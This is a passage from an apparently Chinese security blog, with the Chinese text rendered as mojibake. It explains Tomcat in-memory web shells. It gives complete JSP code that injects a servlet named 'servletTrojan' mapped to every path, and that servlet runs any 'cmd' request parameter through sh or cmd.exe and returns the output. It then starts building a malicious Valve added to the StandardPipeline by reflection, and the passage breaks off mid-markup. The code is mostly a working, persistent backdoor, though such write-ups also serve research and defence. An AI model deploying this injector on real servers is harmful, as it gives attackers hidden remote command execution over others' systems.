class="headerlink" title="1.è·å–context"></a>1.è·å–context</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) requestField.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) request1.getContext();</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-ç”Ÿæˆæ¶æ„servlet"><a href="#2-ç”Ÿæˆæ¶æ„servlet" class="headerlink" title="2.ç”Ÿæˆæ¶æ„servlet"></a>2.ç”Ÿæˆæ¶æ„servlet</h3><p>ApplicationFilterChain#doFilter()ä¼šè°ƒç”¨servlet.service()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228214354359.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228214354359.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>service()æ–¹æ³•å®é™…ä¸Šåœ¨HttpServlet.classä¸­ï¼Œæä¾›äº†å¤šç§httpæ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸ä»…å¯ä»¥åœ¨servletä¸­é‡å†™doGetã€doPostç­‰è§¦å‘RCEï¼Œè¿˜èƒ½ç›´æ¥é‡å†™service</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228214839952.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228214839952.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HttpServlet</span> <span class="variable">servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpServlet</span>() &#123;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">     <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">         <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">             <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">             <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">             <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                 isLinux = <span class="literal">false</span>;</span><br><span class="line">             &#125;</span><br><span class="line">             String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">             <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">             <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">             <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">             response.getWriter().write(output);</span><br><span class="line">             response.getWriter().flush();</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-ç”Ÿæˆwrapperï¼Œå°è£…è¿›context"><a href="#3-ç”Ÿæˆwrapperï¼Œå°è£…è¿›context" class="headerlink" title="3.ç”Ÿæˆwrapperï¼Œå°è£…è¿›context"></a>3.ç”Ÿæˆwrapperï¼Œå°è£…è¿›context</h3><p>createWrapper()åˆ›å»ºwrapperï¼Œè®¾ç½®servletNameï¼Œä¿®æ”¹LoadOnStartupå±æ€§å€¼ï¼Œè¿˜æœ‰ServletClassæŒ‡å‘ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">   wrapper.setName(<span class="string">&quot;servletTrojan&quot;</span>);</span><br><span class="line">   wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">   wrapper.setServlet(servlet);</span><br><span class="line">   wrapper.setServletClass(HttpServlet.class.getName());</span><br><span class="line"></span><br><span class="line">standardContext.addChild(wrapper);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4-æ·»åŠ æ˜ å°„"><a href="#4-æ·»åŠ æ˜ å°„" class="headerlink" title="4.æ·»åŠ æ˜ å°„"></a>4.æ·»åŠ æ˜ å°„</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">standardContext.addServletMappingDecoded(<span class="string">&quot;/*&quot;</span>, <span class="string">&quot;servletTrojan&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å®Œæ•´ä»£ç ï¼š</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//servletTrojan.jsp</span></span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) requestField.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) request1.getContext();</span><br><span class="line"></span><br><span class="line">    <span class="type">HttpServlet</span> <span class="variable">servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpServlet</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">    wrapper.setName(<span class="string">&quot;servletTrojan&quot;</span>);</span><br><span class="line">    wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    wrapper.setServlet(servlet);</span><br><span class="line">    wrapper.setServletClass(HttpServlet.class.getName());</span><br><span class="line"></span><br><span class="line">    standardContext.addChild(wrapper);</span><br><span class="line">    standardContext.addServletMappingDecoded(<span class="string">&quot;/*&quot;</span>, <span class="string">&quot;servletTrojan&quot;</span>);</span><br><span class="line"></span><br><span class="line">    out.println(<span class="string">&quot;inject done!&quot;</span>);</span><br><span class="line">    out.flush();</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>æµ‹è¯•çš„æ—¶å€™è®°å¾—æŠŠä¸Šä¸€ä¸ªé©¬åˆ æ‰ï¼Œä»¥å…å†²çª</p></blockquote><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228215800071.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228215800071.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228215818947.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228215818947.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="å››ã€valveå†…å­˜é©¬"><a href="#å››ã€valveå†…å­˜é©¬" class="headerlink" title="å››ã€valveå†…å­˜é©¬"></a>å››ã€valveå†…å­˜é©¬</h2><p>valueæ˜¯Tomcatä¸­å¯¹Containerç»„ä»¶è¿›è¡Œçš„æ‰©å±•ã€‚Containerç»„ä»¶ä¹Ÿå°±æ˜¯å‰æ–‡ä¸€ç›´æåŠçš„Tomcatå››å¤§å®¹å™¨</p><p>Tomcatç”±å››å¤§å®¹å™¨ç»„æˆï¼Œåˆ†åˆ«æ˜¯<strong>Engineã€Hostã€Contextã€Wrapper</strong>ã€‚è¿™å››ä¸ªç»„ä»¶æ˜¯è´Ÿè´£å…³ç³»ï¼Œå­˜åœ¨åŒ…å«å…³ç³»ã€‚åªåŒ…å«ä¸€ä¸ªå¼•æ“ï¼ˆEngineï¼‰ï¼š</p><blockquote><p>   Engineï¼ˆå¼•æ“ï¼‰ï¼šè¡¨ç¤ºå¯è¿è¡Œçš„Catalinaçš„servletå¼•æ“å®ä¾‹ï¼Œå¹¶ä¸”åŒ…å«äº†servletå®¹å™¨çš„æ ¸å¿ƒåŠŸèƒ½ã€‚åœ¨ä¸€ä¸ªæœåŠ¡ä¸­åªèƒ½æœ‰ä¸€ä¸ªå¼•æ“ã€‚åŒæ—¶ï¼Œä½œä¸ºä¸€ä¸ªçœŸæ­£çš„å®¹å™¨ï¼ŒEngineå…ƒç´ ä¹‹ä¸‹å¯ä»¥åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªè™šæ‹Ÿä¸»æœºã€‚å®ƒä¸»è¦åŠŸèƒ½æ˜¯å°†ä¼ å…¥è¯·æ±‚å§”æ‰˜ç»™é€‚å½“çš„è™šæ‹Ÿä¸»æœºå¤„ç†ã€‚å¦‚æœæ ¹æ®åç§°æ²¡æœ‰æ‰¾åˆ°å¯å¤„ç†çš„è™šæ‹Ÿä¸»æœºï¼Œé‚£ä¹ˆå°†æ ¹æ®é»˜è®¤çš„Hostæ¥åˆ¤æ–­è¯¥ç”±å“ªä¸ªè™šæ‹Ÿä¸»æœºå¤„ç†ã€‚<br>   Host ï¼ˆè™šæ‹Ÿä¸»æœºï¼‰ï¼šä½œç”¨å°±æ˜¯è¿è¡Œå¤šä¸ªåº”ç”¨ï¼Œå®ƒè´Ÿè´£å®‰è£…å’Œå±•å¼€è¿™äº›åº”ç”¨ï¼Œå¹¶ä¸”æ ‡è¯†è¿™ä¸ªåº”ç”¨ä»¥ä¾¿èƒ½å¤ŸåŒºåˆ†å®ƒä»¬ã€‚å®ƒçš„å­å®¹å™¨é€šå¸¸æ˜¯ Contextã€‚ä¸€ä¸ªè™šæ‹Ÿä¸»æœºä¸‹éƒ½å¯ä»¥éƒ¨ç½²ä¸€ä¸ªæˆ–è€…å¤šä¸ªWeb Appï¼Œæ¯ä¸ªWeb Appå¯¹åº”äºä¸€ä¸ªContextï¼Œå½“Hostè·å¾—ä¸€ä¸ªè¯·æ±‚æ—¶ï¼Œå°†æŠŠè¯¥è¯·æ±‚åŒ¹é…åˆ°æŸä¸ªContextä¸Šï¼Œç„¶åæŠŠè¯¥è¯·æ±‚äº¤ç»™è¯¥Contextæ¥å¤„ç†ã€‚ä¸»æœºç»„ä»¶ç±»ä¼¼äºApacheä¸­çš„è™šæ‹Ÿä¸»æœºï¼Œä½†åœ¨Tomcatä¸­åªæ”¯æŒåŸºäºFQDN(å®Œå…¨åˆæ ¼çš„ä¸»æœºå)çš„â€œè™šæ‹Ÿä¸»æœºâ€ã€‚Hostä¸»è¦ç”¨æ¥è§£æweb.xmlã€‚<br>    Contextï¼ˆä¸Šä¸‹æ–‡ï¼‰ï¼šä»£è¡¨ Servlet çš„ Contextï¼Œå®ƒå…·å¤‡äº† Servlet è¿è¡Œçš„åŸºæœ¬ç¯å¢ƒï¼Œå®ƒè¡¨ç¤ºWebåº”ç”¨ç¨‹åºæœ¬èº«ã€‚Context æœ€é‡è¦çš„åŠŸèƒ½å°±æ˜¯ç®¡ç†å®ƒé‡Œé¢çš„ Servlet å®ä¾‹ï¼Œä¸€ä¸ªContextä»£è¡¨ä¸€ä¸ªWebåº”ç”¨ï¼Œä¸€ä¸ªWebåº”ç”¨ç”±ä¸€ä¸ªæˆ–è€…å¤šä¸ªServletå®ä¾‹ç»„æˆã€‚<br>    Wrapperï¼ˆåŒ…è£…å™¨ï¼‰ï¼šä»£è¡¨ä¸€ä¸ª Servletï¼Œå®ƒè´Ÿè´£ç®¡ç†ä¸€ä¸ª Servletï¼ŒåŒ…æ‹¬çš„ Servlet çš„è£…è½½ã€åˆå§‹åŒ–ã€æ‰§è¡Œä»¥åŠèµ„æºå›æ”¶ã€‚Wrapper æ˜¯æœ€åº•å±‚çš„å®¹å™¨ï¼Œå®ƒæ²¡æœ‰å­å®¹å™¨äº†ï¼Œæ‰€ä»¥è°ƒç”¨å®ƒçš„ addChild å°†ä¼šæŠ¥é”™ã€‚ </p></blockquote><p>è¿™å››å¤§ç»„ä»¶éƒ½æœ‰è‡ªå·±çš„ç®¡é“Pipelineã€‚å°±åƒå‰æ–‡Filterå’ŒServletçš„å®é™…å¤„ç†è¯·æ±‚çš„æ–¹æ³•ï¼Œéƒ½åœ¨Wrapperçš„ç®¡é“Pipeline-&gt;Valve-ValveBase-StandardWrapperValve#invokeæ–¹æ³•ä¸­è°ƒç”¨</p><p>Pipelineå°±ç›¸å½“äºæ‹¦æˆªå™¨é“¾ï¼Œå…·ä½“çœ‹<a href="https://www.cnblogs.com/coldridgeValley/p/5816414.html">https://www.cnblogs.com/coldridgeValley/p/5816414.html</a></p><p>å½“è¯·æ±‚åˆ°è¾¾<code>Engine</code>å®¹å™¨çš„æ—¶å€™ï¼Œ<code>Engine</code>å¹¶éæ˜¯ç›´æ¥è°ƒç”¨å¯¹åº”çš„<code>Host</code>å»å¤„ç†ç›¸å…³çš„è¯·æ±‚ï¼Œè€Œæ˜¯è°ƒç”¨äº†è‡ªå·±çš„ä¸€ä¸ªç»„ä»¶å»å¤„ç†ï¼Œè¿™ä¸ªç»„ä»¶å°±å«åš<code>pipeline</code>ç»„ä»¶</p><p>valveæ¥å£</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228221503105.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228221503105.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>valveçš„invokeæ–¹æ³•å°†è¯·æ±‚ä¼ å…¥ä¸‹ä¸€ä¸ªvalveã€‚å¦‚æœä¸è°ƒç”¨ä¸‹ä¸€ä¸ªvalveçš„invokeï¼Œé‚£è¯·æ±‚åˆ°æ­¤ä¸­æ–­</p><p>åœ¨servletè°ƒè¯•æ—¶ä¹Ÿèƒ½çœ‹åˆ°ä¾æ¬¡è°ƒç”¨valveçš„è¿‡ç¨‹ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229124851725.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229124851725.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><code>Valve</code>å­˜æ”¾çš„æ–¹å¼å¹¶éç»Ÿä¸€å­˜æ”¾åœ¨<code>Pipeline</code>ä¸­ï¼Œè€Œæ˜¯åƒä¸€ä¸ªé“¾è¡¨ä¸€ä¸ªæ¥ç€ä¸€ä¸ªã€‚</p><p>è°ƒç”¨<code>getNext()</code>æ–¹æ³•å³å¯è·å–åœ¨è¿™ä¸ª<code>Pipeline</code>ä¸Šçš„ä¸‹ä¸ª<code>Valve</code>å®ä¾‹</p><p>ä¸€èˆ¬ä½¿ç”¨å®ç°äº†valveæ¥å£çš„ValveBaseç±»ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229123320805.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229123320805.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="valveçš„ç”Ÿæˆå’Œé…ç½®"><a href="#valveçš„ç”Ÿæˆå’Œé…ç½®" class="headerlink" title="valveçš„ç”Ÿæˆå’Œé…ç½®"></a>valveçš„ç”Ÿæˆå’Œé…ç½®</h3><h4 id="1-æ–°å»ºvalve"><a href="#1-æ–°å»ºvalve" class="headerlink" title="1.æ–°å»ºvalve"></a>1.æ–°å»ºvalve</h4><p>æ–°å»ºvalveåªéœ€è¦ç»§æ‰¿ValveBaseç±»å¹¶å®ç°invokeæ–¹æ³•ï¼Œpipelineç®¡é“ä¼šä¾æ¬¡æ‰§è¡Œvalveçš„invoke</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilValve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.getNext().invoke(request, response);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-æ³¨å†Œvalve"><a href="#2-æ³¨å†Œvalve" class="headerlink" title="2.æ³¨å†Œvalve"></a>2.æ³¨å†Œvalve</h4><p><strong>å››å¤§ç»„ä»¶Engine&#x2F;Host&#x2F;Context&#x2F;Wrapperéƒ½æœ‰è‡ªå·±çš„Pipeline</strong>ï¼Œåœ¨ContainerBaseåŸºç±»é‡Œå®šä¹‰äº†Pipeline:</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229124307546.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229124307546.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è€ŒStandardPipelineæ ‡å‡†ç±»é‡Œæœ‰addValveæ–¹æ³•</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229124444164.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229124444164.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h4 id="3-è°ƒç”¨valve"><a href="#3-è°ƒç”¨valve" class="headerlink" title="3.è°ƒç”¨valve"></a>3.è°ƒç”¨valve</h4><p>åœ¨CoyoteAdapter.service()è·å–äº†Pipelineçš„ç¬¬ä¸€ä¸ªValveï¼Œå¹¶ä¸”è°ƒç”¨äº†invoke</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229125043383.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229125043383.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿™é‡Œçš„ç¬¬ä¸€ä¸ªvalveå°±æ˜¯StandardEngineValve</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229125227060.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229125227060.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è·Ÿè¿›åˆ°StandardEngineValve#invokeï¼Œå¯ä»¥çœ‹åˆ°è°ƒç”¨äº†ä¸‹ä¸€ä¸ªinvokeï¼Œåœ¨å·¦ä¸‹è§’çš„è°ƒè¯•æ¡†ï¼Œä¹Ÿå°±æ˜¯valve.invokeçš„è°ƒç”¨é¡ºåº</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229125422446.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229125422446.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ ¹æ®valveçš„ç”Ÿæˆå’Œé…ç½®ï¼Œæ¨¡æ‹Ÿæ³¨å†Œæ¶æ„valveï¼š</p><ol><li>è·å–context</li><li>ä»StandardContextåå°„è·å–StandardPipeline</li><li>è°ƒç”¨addValveæ·»åŠ æ¶æ„Valve</li></ol><h3 id="1-è·å–context-3"><a href="#1-è·å–context-3" class="headerlink" title="1. è·å–context"></a>1. è·å–context</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) requestField.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) request1.getContext();</span><br></pre></td></tr></table></figure><h3 id="2-åå°„è·å–StandardPipeline"><a href="#2-åå°„è·å–StandardPipeline" class="headerlink" title="2. åå°„è·å–StandardPipeline"></a>2. åå°„è·å–StandardPipeline</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">pipelineField</span> <span class="operator">=</span> ContainerBase.class.getDeclaredField(<span class="string">&quot;pipeline&quot;</span>);</span><br><span class="line">    pipelineField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardPipeline</span> <span class="variable">standardPipeline1</span> <span class="operator">=</span> (StandardPipeline) pipelineField.get(standardContext);</span><br></pre></td></tr></table></figure><h3 id="3-åˆ›å»ºæ³¨å†Œæ¶æ„valveå¹¶æ·»åŠ è¿›standardPipeline"><a href="#3-åˆ›å»ºæ³¨å†Œæ¶æ„valveå¹¶æ·»åŠ è¿›standardPipeline" class="headerlink" title="3. åˆ›å»ºæ³¨å†Œæ¶æ„valveå¹¶æ·»åŠ è¿›standardPipeline"></a>3. åˆ›å»ºæ³¨å†Œæ¶æ„valveå¹¶æ·»åŠ è¿›standardPipeline</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ValveBase</span> <span class="variable">valveBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ValveBase</span>() &#123;</span><br><span class="line">       <span class="meta">@Override</span></span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span>&#123;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">           Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">           &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">               e.printStackTrace();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">   standardPipeline1.addValve(valveBase);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸ºäº†ä½¿æ­£å¸¸invokeèƒ½è¿›è¡Œä¸‹å»ï¼Œæ¶æ„valveä¹Ÿåº”è¯¥è°ƒç”¨ä¸‹ä¸€ä¸ªvalve.invoke</p><figure 